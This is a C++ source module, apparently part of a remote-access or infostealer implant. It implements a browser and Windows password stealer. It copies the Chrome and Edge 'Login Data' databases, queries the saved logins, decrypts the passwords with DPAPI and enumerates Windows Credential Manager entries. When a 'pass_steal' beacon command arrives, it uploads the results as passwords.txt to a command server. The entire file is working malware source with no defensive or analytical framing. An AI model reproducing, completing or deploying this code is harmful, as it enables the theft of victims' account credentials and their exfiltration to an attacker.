#include "password_stealer.h"
#include "../config.h"
#include "../utils.h"
#include "../beacon.h"
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include "../../libs/sqlite3/sqlite3.h"

namespace PasswordStealer {
    std::string GetChromeLoginPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
        return std::string(path) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    }
    
    std::string GetEdgeLoginPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
        return std::string(path) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    }
    
    std::vector<BYTE> DecryptWithDPAPI(const std::vector<BYTE>& encrypted) {
        DATA_BLOB inBlob, outBlob;
        inBlob.cbData = (DWORD)encrypted.size();
        inBlob.pbData = (BYTE*)encrypted.data();
        
        if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
            std::vector<BYTE> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
            LocalFree(outBlob.pbData);
            return result;
        }
        return std::vector<BYTE>();
    }
    
    std::string StealFromBrowser(const std::string& dbPath) {
        std::string result;
        
        std::string tempPath = std::string(LOG_PATH) + ".logins.tmp";
        CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE);
        
        sqlite3* db = NULL;
        if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            DeleteFileA(tempPath.c_str());
            return "";
        }
        
        sqlite3_stmt* stmt = NULL;
        const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* username = (const char*)sqlite3_column_text(stmt, 1);
                const void* encrypted = sqlite3_column_blob(stmt, 2);
                int encryptedLen = sqlite3_column_bytes(stmt, 2);
                
                std::vector<BYTE> encryptedData((BYTE*)encrypted, (BYTE*)encrypted + encryptedLen);
                auto decrypted = DecryptWithDPAPI(encryptedData);
                
                result += "URL: " + std::string(url ? url : "") + "\n";
                result += "Username: " + std::string(username ? username : "") + "\n";
                result += "Password: " + std::string(decrypted.begin(), decrypted.end()) + "\n";
                result += "---\n";
            }
            sqlite3_finalize(stmt);
        }
        
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return result;
    }
    
    void Steal() {
        std::string allPasswords;
        
        std::string chromePath = GetChromeLoginPath();
        if (GetFileAttributesA(chromePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            allPasswords += "=== CHROME PASSWORDS ===\n";
            allPasswords += StealFromBrowser(chromePath);
        }
        
        std::string edgePath = GetEdgeLoginPath();
        if (GetFileAttributesA(edgePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            allPasswords += "=== EDGE PASSWORDS ===\n";
            allPasswords += StealFromBrowser(edgePath);
        }
        
        // Windows Credential Manager
        allPasswords += "=== WINDOWS CREDENTIALS ===\n";
        DWORD count = 0;
        PCREDENTIALA* creds = NULL;
        if (CredEnumerateA(NULL, 0, &count, &creds)) {
            for (DWORD i = 0; i < count; i++) {
                allPasswords += "Target: " + std::string(creds[i]->TargetName) + "\n";
                allPasswords += "User: " + std::string(creds[i]->UserName ? creds[i]->UserName : "") + "\n";
                if (creds[i]->CredentialBlobSize > 0) {
                    allPasswords += "Password: " + std::string(
                        (char*)creds[i]->CredentialBlob, 
                        creds[i]->CredentialBlobSize / sizeof(wchar_t)
                    ) + "\n";
                }
                allPasswords += "---\n";
            }
            CredFree(creds);
        }
        
        if (!allPasswords.empty()) {
            Beacon::UploadFile("pass_steal", "passwords.txt",
                std::vector<BYTE>(allPasswords.begin(), allPasswords.end()));
        }
    }
    
    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "pass_steal") Steal();
    }
}